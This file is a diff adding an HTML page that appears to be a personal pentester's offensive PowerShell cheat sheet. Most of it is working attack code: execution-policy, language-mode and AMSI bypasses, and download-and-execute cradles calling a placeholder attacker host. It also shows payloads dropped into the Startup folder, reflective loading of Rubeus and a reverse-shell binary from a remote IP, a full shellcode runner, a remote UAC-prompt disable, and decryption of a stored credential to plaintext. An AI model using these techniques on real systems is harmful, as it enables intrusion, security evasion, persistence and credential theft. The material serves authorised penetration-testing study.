@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>PowerShell — Corey Clay</title>
+<meta name="description" content="PowerShell reference for pentesters — execution policy and Constrained Language Mode bypass, encoded commands, download cradles, reflective C# assembly loading, Win32 API via reflection, AMSI bypass, and secure-string plaintext recovery.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ tools & utilities / powershell</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a class="here" href="tools-utilities.html" aria-current="page">tools &amp; utilities</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="tools-utilities.html">&lsaquo; tools &amp; utilities</a> &nbsp;/&nbsp; // offensive-powershell</p>
+  <h1>PowerShell</h1>
+  <p>Offensive PowerShell — execution-policy and Constrained Language Mode bypass, encoded commands (UTF-16LE), proxy-aware download cradles, reflective C# assembly loading, Win32 API calls via reflection and delegate types, AMSI bypass, and converting encrypted SecureStrings back to plaintext.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#execution-policy">Execution Policy</a>
+      <a href="#constrained-language-mode">Constrained Language Mode</a>
+      <a href="#encoded-commands">Encoded Commands</a>
+      <a href="#download-files">Download Files</a>
+      <a href="#load-powershell-scripts">Load PowerShell Scripts</a>
+      <a href="#load-c-assembly-reflectively">Load C# Assembly Reflectively</a>
+      <a href="#win-api-calls-via-reflection">Win API Calls via Reflection</a>
+      <a href="#secure-string-to-plaintext">Secure String to Plaintext</a>
+      <a href="#useful-one-liners">Useful One-Liners</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<h2 id="execution-policy">Execution Policy</h2>
+<p>Bypass execution policy to run unsigned scripts:</p>
+<pre><code class="language-ps1">powershell -EncodedCommand $encodedCommand
+powershell -ep bypass ./PowerView.ps1
+powershell -ExecutionPolicy Bypass -NoProfile -File .\script.ps1
+</code></pre>
+<p>Change execution policy (local):</p>
+<pre><code class="language-ps1">Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+Set-ExecutionPolicy Bypass -Scope Process
+</code></pre>
+<h2 id="constrained-language-mode">Constrained Language Mode</h2>
+<p>Check current language mode:</p>
+<pre><code class="language-ps1">$ExecutionContext.SessionState.LanguageMode
+## Values: FullLanguage or ConstrainedLanguage
+</code></pre>
+<p>Bypass constrained mode:</p>
+<pre><code class="language-ps1">powershell -version 2
+</code></pre>
+<h2 id="encoded-commands">Encoded Commands</h2>
+<h3>Windows (UTF-16LE)</h3>
+<pre><code class="language-ps1">$command = 'IEX (New-Object Net.WebClient).DownloadString(&quot;http://&lt;ATTACKER_IP&gt;/PowerView.ps1&quot;)'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell -EncodedCommand $encodedCommand
+</code></pre>
+<h3>Linux (UTF-16LE encoding required)</h3>
+<pre><code class="language-bash">echo 'IEX (New-Object Net.WebClient).DownloadString(&quot;http://&lt;ATTACKER_IP&gt;/PowerView.ps1&quot;)' | iconv -t utf-16le | base64 -w 0
+</code></pre>
+<h2 id="download-files">Download Files</h2>
+<h3>Any PowerShell Version</h3>
+<pre><code class="language-ps1">(New-Object System.Net.WebClient).DownloadFile(&quot;http://&lt;ATTACKER_IP&gt;/PowerView.ps1&quot;, &quot;C:\Windows\Temp\PowerView.ps1&quot;)
+wget &quot;http://&lt;ATTACKER_IP&gt;/taskkill.exe&quot; -OutFile &quot;C:\ProgramData\unifivideo\taskkill.exe&quot;
+Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output
+</code></pre>
+<h3>PowerShell 4+</h3>
+<pre><code class="language-ps1">IWR &quot;http://&lt;ATTACKER_IP&gt;/binary.exe&quot; -OutFile &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe&quot;
+Invoke-WebRequest &quot;http://&lt;ATTACKER_IP&gt;/binary.exe&quot; -OutFile &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe&quot;
+</code></pre>
+<h2 id="load-powershell-scripts">Load PowerShell Scripts</h2>
+<h3>Proxy-Aware Methods</h3>
+<pre><code class="language-ps1">## Download and execute in one line
+IEX (New-Object Net.WebClient).DownloadString('http://&lt;ATTACKER_IP&gt;/PowerView.ps1')
+
+## Via echo and pipeline
+echo IEX(New-Object Net.WebClient).DownloadString('http://&lt;ATTACKER_IP&gt;/PowerView.ps1') | powershell -noprofile -
+
+## With credentials and proxy handling
+powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://&lt;ATTACKER_IP&gt;/PowerView.ps1')|iex&quot;
+</code></pre>
+<h3>Non-Proxy Aware</h3>
+<pre><code class="language-ps1">$h=new-object -com WinHttp.WinHttpRequest.5.1
+$h.open('GET','http://&lt;ATTACKER_IP&gt;/PowerView.ps1',$false)
+$h.send()
+iex $h.responseText
+</code></pre>
+<h2 id="load-c-assembly-reflectively">Load C# Assembly Reflectively</h2>
+<h3>Download and Run Assembly (No Arguments)</h3>
+<pre><code class="language-powershell">$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[rev.Program]::Main()
+</code></pre>
+<h3>Download and Run with Arguments</h3>
+<pre><code class="language-powershell">## Download and run Rubeus with arguments
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Rubeus.Program]::Main(&quot;s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt&quot;.Split())
+</code></pre>
+<h3>Execute Specific Method from Assembly (DLL)</h3>
+<pre><code class="language-powershell">$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType(&quot;ClassLibrary1.Class1&quot;)
+$method = $class.GetMethod(&quot;runner&quot;)
+$method.Invoke(0, $null)
+</code></pre>
+<h2 id="win-api-calls-via-reflection">Win API Calls via Reflection</h2>
+<h3>Resolve Address Functions</h3>
+<p>First, obtain <code>GetModuleHandle</code> and <code>GetProcAddress</code>:</p>
+<pre><code class="language-powershell">## Retrieve all loaded Assemblies
+$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+
+## Find System.dll from GAC
+$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
+  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
+})
+
+$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+## Get GetModuleHandle
+$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
+
+## Get GetProcAddress (handles multiple overloads)
+$GetProcAddress = $unsafeObj.GetMethod('GetProcAddress',
+        [reflection.bindingflags]'Public,Static', 
+        $null, 
+        [System.Reflection.CallingConventions]::Any,
+        @([System.IntPtr], [string]), 
+        $null)
+</code></pre>
+<h3>Function Resolution Helper</h3>
+<pre><code class="language-powershell">function LookupFunc {
+    Param ($moduleName, $functionName)
+
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
+        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
+    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq &quot;GetProcAddress&quot;) {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+</code></pre>
+<h3>Create Delegate Type</h3>
+<pre><code class="language-powershell">function Get-Delegate {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
+        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
+        [Parameter(Position = 2)] [Type] $retType = [Void]
+    )
+
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName('QD')), 
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule('QM', $false).DefineType(
+        'QT', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+        [System.MulticastDelegate]
+    )
+
+    $type.DefineConstructor(
+        'RTSpecialName, HideBySig, Public',
+        [System.Reflection.CallingConventions]::Standard, 
+        $argTypes
+    ).SetImplementationFlags('Runtime, Managed')
+
+    $type.DefineMethod(
+        'Invoke', 
+        'Public, HideBySig, NewSlot, Virtual', 
+        $retType, 
+        $argTypes
+    ).SetImplementationFlags('Runtime, Managed')
+
+    $delegate = $type.CreateType()
+    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
+}
+</code></pre>
+<h3>Example: Simple Shellcode Runner</h3>
+<pre><code class="language-powershell">function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
+        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
+    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq &quot;GetProcAddress&quot;) {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function Get-Delegate {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
+        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
+        [Parameter(Position = 2)] [Type] $retType = [Void]
+    )
+
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName('QD')), 
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule('QM', $false).DefineType(
+        'QT', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+        [System.MulticastDelegate]
+    )
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
+        [System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
+    $delegate = $type.CreateType()
+    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
+}
+
+## Resolve function addresses
+$VirtualAllocAddr = LookupFunc &quot;Kernel32.dll&quot; &quot;VirtualAlloc&quot;
+$CreateThreadAddr = LookupFunc &quot;Kernel32.dll&quot; &quot;CreateThread&quot;
+$WaitForSingleObjectAddr = LookupFunc &quot;Kernel32.dll&quot; &quot;WaitForSingleObject&quot; 
+
+## Create delegate functions
+$VirtualAlloc = Get-Delegate $VirtualAllocAddr @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+$CreateThread = Get-Delegate $CreateThreadAddr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32]) ([Int])
+
+## Your shellcode
+[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,...
+
+## Execute shellcode
+$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)
+$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
+</code></pre>
+<h2 id="secure-string-to-plaintext">Secure String to Plaintext</h2>
+<p>Convert encrypted SecureString to plaintext:</p>
+<pre><code class="language-ps1">$pass = &quot;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692&quot; | convertto-securestring
+$user = &quot;HTB\Tom&quot;
+$cred = New-Object System.management.Automation.PSCredential($user, $pass)
+$cred.GetNetworkCredential() | fl
+## UserName       : Tom
+## Password       : 1ts-mag1c!!!
+## Domain         : HTB
+</code></pre>
+<h2 id="useful-one-liners">Useful One-Liners</h2>
+<h3>AMSI Bypass</h3>
+<pre><code class="language-ps1">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+</code></pre>
+<h3>Get Running Processes</h3>
+<pre><code class="language-ps1">Get-Process
+</code></pre>
+<h3>List Network Connections</h3>
+<pre><code class="language-ps1">Get-NetTCPConnection
+netstat -ano
+</code></pre>
+<h3>Get Users and Groups</h3>
+<pre><code class="language-ps1">Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember -Group Administrators
+</code></pre>
+<h3>Enumerate SMB Shares</h3>
+<pre><code class="language-ps1">Get-SmbShare
+</code></pre>
+<h3>PowerShell Remoting</h3>
+<pre><code class="language-ps1">## Enable remoting
+Enable-PSRemoting
+
+## Disable UAC prompt
+Invoke-Command -ComputerName &lt;IP&gt; -ScriptBlock { Set-ItemProperty -Path &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; -Name ConsentPromptBehaviorAdmin -Value 0 }
+
+## Execute command remotely
+Invoke-Command -ComputerName &lt;IP&gt; -ScriptBlock { whoami }
+
+## Session
+$session = New-PSSession -ComputerName &lt;IP&gt;
+Invoke-Command -Session $session -ScriptBlock { whoami }
+</code></pre>
+<h3>Get System Info</h3>
+<pre><code class="language-ps1">systeminfo
+Get-ComputerInfo
+</code></pre>
+<h3>Download and Execute</h3>
+<pre><code class="language-ps1">IEX(New-Object Net.WebClient).DownloadString('http://&lt;IP&gt;/script.ps1')
+</code></pre>
+<h3>Base64 Encode/Decode</h3>
+<pre><code class="language-ps1">## Encode
+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('command'))
+
+## Decode
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('base64string'))
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/">Windows &amp; Active Directory Exploitation Cheat Sheet - @chvancooten</a></li>
+<li><a href="https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters">Basic PowerShell for Pentesters - HackTricks</a></li>
+<li><a href="https://docs.microsoft.com/en-us/powershell/">Microsoft PowerShell Documentation</a></li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — tools & utilities / powershell · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
